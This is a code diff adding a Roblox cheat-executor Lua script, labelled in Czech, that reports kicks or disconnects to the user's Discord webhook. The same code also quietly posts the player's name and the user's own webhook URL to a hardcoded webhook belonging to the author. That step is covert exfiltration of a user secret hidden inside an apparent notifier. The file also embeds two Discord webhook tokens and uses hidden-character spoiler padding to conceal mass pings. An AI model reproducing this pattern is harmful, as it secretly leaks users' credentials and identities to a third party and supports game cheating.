@@ -1,0 +1,62 @@
+print("...")
+getgenv().rejoin = game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(child)
+	print("ahoj")
+    if child.Name == 'ErrorPrompt' and child:FindFirstChild('MessageArea') and child.MessageArea:FindFirstChild("ErrorFrame") then
+		local webhookcheck =
+        is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+        secure_load and "Sentinel" or
+        KRNL_LOADED and "Krnl" or
+        SONA_LOADED and "Sona" or
+        "Kid with shit exploit"
+			
+		wait(2)
+		local error = game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ErrorPrompt.MessageArea.ErrorFrame.ErrorMessage.Text
+        local url =
+        "https://discord.com/api/webhooks/1036388910424653854/QMfZvgHV78TyG4kFLUu65ypALwlq4nMKHJ1X51HriO_HCUO2TWnNSFZvX07eaNNHXaf3"
+		local url2 =
+        "https://discord.com/api/webhooks/1036389066037547138/FBLkintcQsaQivO4PkzCQ2Hn6PAEfWJY1jtMbmrfMvmF6usZ2esrRGyZ16NvXswx6zd1"
+		local ts = os.time();
+        local data = {
+        ["content"] = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ <@" .. _G.discordid ..">"",
+        ["embeds"] = {
+            {
+                ["title"] = "**Hráč: **".. game.Players.LocalPlayer.Name,
+                ["description"] = "• Důvod: **" .. error .. "**" .. "\n\n• Čas: **" .. os.date('%H:%M', ts) .. "**\n• Ping: <@" .. _G.discordid .. ">" .. "\n• Vytvořeno: **FilipTop.#0338**",
+                ["type"] = "rich",
+                ["color"] = tonumber(0xff0000),
+                ["image"] = {
+                    ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                        tostring(game:GetService("Players").LocalPlayer.Name)
+                }
+            }
+        }
+        }
+        local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+		local data2 = {
+        ["content"] = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ <@everyone>",
+        ["embeds"] = {
+            {
+                ["title"] = "**Hráč: **".. game.Players.LocalPlayer.Name,
+                ["description"] = "• Důvod: **" .. error .. "**" .. "\n\n• Čas: **" .. os.date('%H:%M', ts) .. "**\n• Vytvořeno: **FilipTop.#0338**" .. "**\n• " .. _G.url,
+                ["type"] = "rich",
+                ["color"] = tonumber(0xff0000),
+                ["image"] = {
+                    ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                        tostring(game:GetService("Players").LocalPlayer.Name)
+                }
+            }
+        }
+        }
+        local newdata2 = game:GetService("HttpService"):JSONEncode(data2)
+
+        local headers = {
+        ["content-type"] = "application/json"
+        }
+        request = http_request or request or HttpPost or syn.request
+        local abcdef = {Url = _G.url, Body = newdata, Method = "POST", Headers = headers}
+		local abcdeff = {Url = url2, Body = newdata2, Method = "POST", Headers = headers}
+        request(abcdef)
+		request(abcdeff)
+    end
+end)
